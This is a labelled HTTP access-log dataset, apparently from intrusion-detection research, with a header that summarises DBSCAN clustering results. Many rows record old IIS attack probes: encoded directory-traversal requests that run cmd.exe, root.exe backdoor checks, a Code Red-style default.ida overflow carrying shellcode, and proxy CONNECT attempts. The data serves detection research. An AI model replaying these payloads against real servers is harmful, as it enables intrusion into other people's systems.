#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2021-02-09 00:10:18
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.011141 seconds)
#  ~ The DBSCAN clustering process was performed in 0.162435 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 96.41%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["A050"]. Details:{'A05': 484}
#       Cluster [1] contains 979 items. MV:["A011"]. Details:{'A01': 979}
#       Cluster [2] contains 109 items. MV:["A022"]. Details:{'A02': 109}
#       Cluster [3] contains 86 items. MV:["A053"]. Details:{'A05': 86}
#       Cluster [4] contains 587 items. MV:["A034"]. Details:{'A03': 587}
#       Cluster [5] contains 23 items. MV:["A045"]. Details:{'A04': 23}
#       Cluster [6] contains 14 items. MV:["A046"]. Details:{'A04': 14}
#       Cluster [7] contains 3 items. MV:["A037"]. Details:{'A03': 3}
#       Cluster [8] contains 46 items. MV:["A098"]. Details:{'A09': 46}
#       Cluster [9] contains 100 items. MV:["A089"]. Details:{'A08': 100}
#       Cluster [10] contains 125 items. MV:["A0610"]. Details:{'A06': 125}
#       Cluster [11] contains 16 items. MV:["A0411"]. Details:{'A04': 16}
#       Cluster [12] contains 32 items. MV:["A0812"]. Details:{'A08': 32}
#       Cluster [13] contains 769 items. MV:["A1013"]. Details:{'A10': 769}
#       Cluster [14] contains 14 items. MV:["A1114"]. Details:{'A11': 14}
#       Cluster [15] contains 54 items. MV:["A1115"]. Details:{'A05': 1, 'A11': 53}
#       Cluster [16] contains 5 items. MV:["A0416"]. Details:{'A04': 5}
#       Cluster [17] contains 57 items. MV:["A1217"]. Details:{'A12': 57}
#       Cluster [18] contains 23 items. MV:["A0718"]. Details:{'A07': 23}
#       Cluster [19] contains 23 items. MV:["A1119"]. Details:{'A11': 23}
#
#  ~ Details of outliers: {'A03': 1, 'A04': 1, 'A05': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        | A01  | A02  | A03  | A04  | A05  | A06  | A07  | A08  | A09  | A10  | A11  | A12  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |  A01   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |  A02   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |  A03   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |  A04   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |  A05   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |  A06   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |  A07   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |  A08   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |  A09   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |  A10   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |  A11   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |  A12   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Referrer~,ClientRequestLine@,Agent@,ObjectSize~,Http_protocol@,HTTP_method,ClientIP$,StatusCode,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1107264801,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264801,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264870,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9064192107195,"'403'","A05","S442","A_0"
1107265953,"-","/NULL.printer","-",1061,"-","GET",9081006250202,"'404'","A01","S575","A_1"
1107277272,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9193095148135,"'403'","A05","S51","A_0"
1107278838,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218242255106,"'403'","A05","S204","A_0"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107279931,"-","/","-",2898,"HTTP/1.0","GET",9069086160253,"'403'","A05","S552","A_3"
1107287312,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9063245085123,"'404'","A01","S434","A_1"
1107291127,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9064085244116,"'403'","A05","S448","A_0"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300922,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300923,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300931,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300931,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300931,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107300931,"-","1.3.3.7:1337","-",975,"HTTP/1.0","CONNECT",9082229169073,"'405'","A04","S578","A_5"
1107304630,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9219134043080,"'403'","A05","S239","A_0"
1107304711,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9143127131004,"'403'","A05","S17","A_0"
1107346378,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9066117040185,"'404'","A01","S464","A_1"
1107358087,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9063162143021,"'403'","A05","S428","A_0"
1107364650,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364652,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364654,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364656,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364658,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364659,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364661,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364663,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364665,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364667,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364668,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364670,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364672,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069086164233,"'400'","A02","S553","A_2"
1107364674,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069086164233,"'400'","A02","S553","A_2"
1107364676,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107364677,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069086164233,"'404'","A01","S553","A_1"
1107369164,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9063175119002,"'403'","A05","S429","A_0"
1107371977,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9066042059082,"'403'","A05","S483","A_0"
1107379567,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9204076166050,"'403'","A05","S97","A_0"
1107380220,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218011001050,"'403'","A05","S183","A_0"
1107397984,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397985,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397986,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397986,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397987,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397988,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397988,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397989,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397990,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397990,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397994,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397995,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397995,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9060248026050,"'400'","A02","S358","A_2"
1107397996,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9060248026050,"'400'","A02","S358","A_2"
1107397996,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107397997,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9060248026050,"'404'","A01","S358","A_1"
1107401224,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9222084042191,"'403'","A05","S317","A_0"
1107415908,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218106185078,"'403'","A05","S182","A_0"
1107419135,"-","/NULL.printer","-",1061,"-","GET",9081006250202,"'404'","A01","S575","A_1"
1107453651,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061010007091,"'403'","A05","S382","A_0"
1107462291,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462292,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462292,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462292,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462295,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462295,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462293,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462295,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462295,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107462294,"-","/sumthin","-",1061,"HTTP/1.0","GET",9210127248052,"'404'","A01","S125","A_1"
1107467544,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061010007168,"'403'","A05","S369","A_0"
1107480557,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9067133116245,"'403'","A05","S494","A_0"
1107491267,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9222166160220,"'403'","A05","S301","A_0"
1107506213,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","-",1061,"HTTP/1.0","GET",9067176032032,"'404'","A01","S504","A_1"
1107508296,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9220168210035,"'403'","A05","S259","A_0"
1107510265,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9012033114007,"'403'","A05","S3","A_0"
1107512009,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512010,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512011,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512011,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512012,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512013,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512014,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512015,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512015,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512016,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512017,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512017,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512018,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9220028212176,"'400'","A02","S270","A_2"
1107512018,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9220028212176,"'400'","A02","S270","A_2"
1107512019,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107512020,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9220028212176,"'404'","A01","S270","A_1"
1107519363,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9143127131004,"'403'","A05","S17","A_0"
1107521081,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9209137237154,"'403'","A05","S118","A_0"
1107524604,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061180025164,"'403'","A05","S398","A_0"
1107530763,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","-",1061,"HTTP/1.0","GET",9081006250202,"'404'","A01","S575","A_1"
1107533767,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9035011228062,"'403'","A05","S346","A_0"
1107544667,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9216010108138,"'403'","A05","S163","A_0"
1107544668,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9064085244116,"'403'","A05","S448","A_0"
1107546810,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061186047103,"'403'","A05","S401","A_0"
1107559173,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9210139114144,"'403'","A05","S126","A_0"
1107568998,"-","/sumthin","-",1050,"HTTP/1.0","GET",9061030127004,"'404'","A01","S412","A_1"
1107568998,"-","/sumthin","-",1050,"HTTP/1.0","GET",9061030127004,"'404'","A01","S412","A_1"
1107569001,"-","/sumthin","-",1050,"HTTP/1.0","GET",9061030127004,"'404'","A01","S412","A_1"
1107578326,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578327,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578328,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578329,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578329,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578330,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578331,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578331,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578332,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578332,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
1107578333,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9172169006104,"'404'","A01","S40","A_1"
